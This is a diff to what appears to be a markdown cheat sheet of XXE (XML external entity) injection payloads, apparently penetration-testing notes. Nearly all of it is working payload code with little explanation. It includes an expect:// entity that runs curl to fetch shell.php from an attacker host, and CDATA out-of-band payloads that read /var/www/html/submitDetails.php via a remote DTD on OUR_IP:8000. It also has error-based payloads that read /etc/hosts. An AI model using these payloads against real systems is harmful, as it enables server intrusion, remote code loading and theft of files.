@@ -54,3 +54,34 @@ Payload
   <!ENTITY "Dynamic Word" SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
 ]>
 ```
+## CDATA
+``` bash
+<!DOCTYPE email [
+  <!ENTITY % begin "<![CDATA["> 
+  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> 
+  <!ENTITY % end "]]>"> 
+  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> 
+  %xxe;
+]>
+
+# File
+ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
+```
+
+## Error Based XXE
+<img width="1531" height="451" alt="image" src="https://github.com/user-attachments/assets/e4859438-5010-4ca5-8576-084519400caa" />
+- Example
+LFI
+``` bash
+<!ENTITY % file SYSTEM "file:///etc/hosts">
+<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>"> 
+```
+RCE
+``` bash
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %error;
+]>
+
+```
